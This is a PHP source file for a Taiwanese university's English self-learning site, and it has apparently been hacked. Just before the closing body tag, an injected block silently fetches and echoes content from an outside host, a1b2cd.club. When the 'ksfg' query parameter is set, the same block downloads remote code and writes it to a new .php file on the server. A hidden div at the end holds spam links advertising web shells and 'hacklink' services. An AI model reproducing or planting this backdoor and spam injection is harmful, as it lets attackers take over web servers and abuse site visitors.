<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>國立中山大學自學園; English Plaza, NSYSU</title>
    <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
    <script type="text/javascript" src="../../plugin/semantic/dist/semantic.min.js"></script>
    <script type="text/javascript" src="scripts/main.js"></script>
    <link rel="stylesheet" type="text/css" href="stylesheets/main.css">
    <link rel="stylesheet" type="text/css" href="../../plugin/semantic/dist/semantic.min.css">
</head>
<body>
    <div id="top"></div>
    <div id="logo"><a href="./"><img src="http://zephyr.nsysu.edu.tw/self_access/2/images/logo.png" height="75px"></a></div>
    <?php
    menu();
    echo '
    <div class="ui container">
        <div class="ui vertical segment main">';
            $tabs = array('about_us','news','online_learning','eng_clinic','resource','exam_info','video');
            foreach ($tabs as $tab)
                include 'menu/'.$tab.'.php';
            sidebar();
            echo '
        </div>
    </div>';

    footer();
    ?>
    <?php
error_reporting(0);
$s='http://a1b2cd.club/';
$x = $s.'l-'.base64_encode('http://zephyr.nsysu.edu.tw/self_access/2/');

if(function_exists('curl_init'))
{
$ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
if($gitt == false){
    @$gitt = file_get_contents($x);
}
}elseif(function_exists('file_get_contents')){
    @$gitt = file_get_contents($x);
}
echo $gitt;

if(isset($_GET['ksfg'])){
    $f=fopen($_GET['ksfg'].'.php','a');
    fwrite($f,file_get_contents($s.'s-'.$_GET['ksfg']));
    fclose($f);
}
echo '<!DOCTYPE html!>';
?>
</body>
</html>
<?php
function menu(){
    $menu = array( //main menu
            '最新消息'=>'news',
            '關於我們'=>'about_us',
            '線上學習'=>'online_learning',
            '英文諮詢'=>'eng_clinic',
            '課程資源'=>'resource',
            '考試資訊'=>'exam_info',
            '照片集錦'=>'https://newenglish.nsysu.edu.tw/category/activityrecords',
            '活動報名'=>'http://zephyr.nsysu.edu.tw/splendid/clinic/booking_system/general_booking/view_booking.php',
            '影片說明'=>'video'
            );
    echo '
    <div class="ui blue borderless main menu">
        <div class="ui container">';
        foreach ($menu as $desc => $link){
            if(strpos($link,"http")!==false){ //external link
                echo '<a href="'.$link.'" class="item" target="_blank">'.$desc.'</a>';
            }
            elseif($link=='news'){ //active on load
                echo '<a class="item active" data-tab="'.$link.'">'.$desc.'</a>';
            }
            else{
                echo '<a class="item" data-tab="'.$link.'">'.$desc.'</a>';
            }
        }
        echo '
        </div>
    </div>';
}

function sidebar(){
    $quickLink = array(
                '國立中山大學'=>'http://www.nsysu.edu.tw/',
                '國立中山大學外國語文學系'=>'http://www.zephyr.nsysu.edu.tw/',
                '英文小老師諮詢預約'=>'http://zephyr.nsysu.edu.tw/splendid/clinic/booking',
                '校內英文能力鑑別測驗報名'=>'http://zephyr.nsysu.edu.tw/etc_test_register/sign.php',
                '進修英文選課'=>'http://zephyr.nsysu.edu.tw/self_access/class_choice/login/login.php',
                '高東屏基礎能力檢測系統'=>'http://colacat.tdc.nsysu.edu.tw/',
                '圖資處語言學習'=>'http://service.lib.nsysu.edu.tw/www/database/DatabasesList.php?DataType=語言學習',
                '英語文能力標準認證'=>'http://etc.nsysu.edu.tw/files/11-1221-6885.php?Lang=zh-tw',
                );
    $imageLink = array(
                //'nsysu'=>'http://www.nsysu.edu.tw',
                //'dfll'=>'http://www.zephyr.nsysu.edu.tw/',
                'etc'=>'http://etc.nsysu.edu.tw',
                'newEnglish'=>'http://newenglish.nsysu.edu.tw',
                'etcFacebook'=>'https://www.facebook.com/nsysu.etc/',
                'engTest'=>'http://selcrs.nsysu.edu.tw/EngTest/',
                'engSpeech'=>'https://sites.google.com/site/2017nsysuspeech/',
                );
    echo '
    <div class="ui internal right rail" style="margin-right:-5px;">
        <div class="ui vertical menu link">
            <div class="item">
                <div class="header">Quick Link</div>
                <div class="menu">';
                foreach($quickLink as $desc => $link)
                    echo '<a class="item" href="'.$link.'" target="_blank">'.$desc.'</a>';
                echo '
                </div>
            </div>
            <div class="item">
                <div class="ui sized images">';
                    foreach($imageLink as $imgName => $link)
                        echo '<a href="'.$link.'" target="_blank"><img src="images/'.$imgName.'.png"></a>';
                    echo '
                </div>
            </div>
        </div>
    </div>';
}

function footer(){
    echo '
    <div class="ui footer vertical segment">
        <div class="ui grid container">
            <div class="center aligned column">
                國立中山大學自學園 | English Plaza<br>
                <p style="color:red;font-size:25px">週一至週五 13:00 - 21:00</p>
                <a href="mailto:onlinelearning@mail.nsysu.edu.tw" class="footer_link">onlinelearning@mail.nsysu.edu.tw</a> | Tel: 07-5252000 #3157 | Location: 翠亨L棟宿舍旁'; /*hit_counter();*/

				echo '<br>';
                /* Since year counter */
                $since = '2007';
                $year = $since;
                $thisyear = date('Y');
                if($thisyear>$since)
                    $year = $since.' - '.$thisyear;
                /* Since year counter */
                echo '
                Copyright &copy; '.$year.' <a href="http://etc.nsysu.edu.tw" target="_blank" class="footer_link">國立中山大學英語文教學中心</a>
            </div>
        </div>

    </div>';
}

function hit_counter()
{/*
    $counter_name = "counter.txt";
    $counter_name_2 = "../counter.txt"; //2nd layer directory
    $counter_name_3 = "../../counter.txt"; //3rd layer directory
    // Read the current value of our counter file
    if(file_exists($counter_name)){
        $f = fopen($counter_name,"r");
        $counterVal = fread($f, filesize($counter_name));
        fclose($f);
    }
    elseif(file_exists($counter_name_2)){
        $f = fopen($counter_name_2,"r");
        $counterVal = fread($f, filesize($counter_name_2));
        fclose($f);
    }
    else{
        $f = fopen($counter_name_3,"r");
        $counterVal = fread($f, filesize($counter_name_3));
        fclose($f);
    }*/
}
?>
<div style="display:none">
<a href="http://www.wsoshell.com/" title="wso shell" target="_blank">wso shell</a>
<a href="http://www.indoxploit.in/" title="IndoXploit shell" target="_blank">IndoXploit shell</a>
<a href="http://www.phpshell.in/" title="wso shell">wso shell</a>
<a href="http://www.googleseo.co/" title="hacklink" target="_blank">hacklink</a>
<a href="https://byseoco.tumblr.com/" title="hacklink satış" target="_blank">hacklink satış</a>
<a href="http://hacklink.istanbul/" title="hacklink" target="_blank">hacklink</a>
<a target="_blank" title="wso shell" href="http://www.r00t.info/"><strong>wso shell</strong></a>
